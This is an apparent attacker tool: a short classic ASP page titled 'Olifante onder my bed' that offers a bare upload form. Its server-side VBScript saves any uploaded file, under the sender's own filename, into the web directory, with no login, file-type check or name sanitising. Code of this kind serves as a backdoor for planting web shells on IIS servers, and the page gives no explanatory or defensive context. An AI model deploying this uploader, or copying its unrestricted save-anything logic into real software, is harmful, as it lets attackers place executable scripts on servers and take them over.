<html><head><title>Olifante onder my bed</title></head><body>
<form method=post ENCTYPE="multipart/form-data">
File : <input type="file" name="File1"><br>
<input type="submit" Name="Action" value="Upload the file">
</form>
</body></HTML>
<!--#INCLUDE FILE="upload.inc"-->
<%
If Request.ServerVariables("REQUEST_METHOD") = "POST" Then 
Set Fields = GetUpload()
FilePath = Server.MapPath(".") & "\" & Fields("File1").FileName
Fields("File1").Value.SaveAs FilePath
End If
%>